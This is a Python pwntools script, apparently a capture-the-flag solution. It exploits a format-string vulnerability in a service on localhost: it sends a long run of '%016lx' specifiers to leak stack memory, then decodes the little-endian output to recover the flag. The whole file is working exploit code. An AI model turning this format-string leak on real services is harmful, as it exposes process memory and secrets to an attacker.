from pwn import *
p = remote('localhost', 2002)
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.sendline(b'2')
p.recvline()
b = b'%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx'
print(len(b))
p.sendline(b)
res = p.recvline()
res = res.decode("utf-8")
start = res.index('7b') - 2 # find {, sub 2 since { is the 7th char and this is little endian
res = res[start:]
final = []
for i in range(0, len(res), 16):
    for j in range(14, -2, -2):
        if i+j+2 >= len(res):
            continue # ignore end of string
        final.append(int(res[i+j:i+j+2], 16))
print(''.join(map(chr, final)))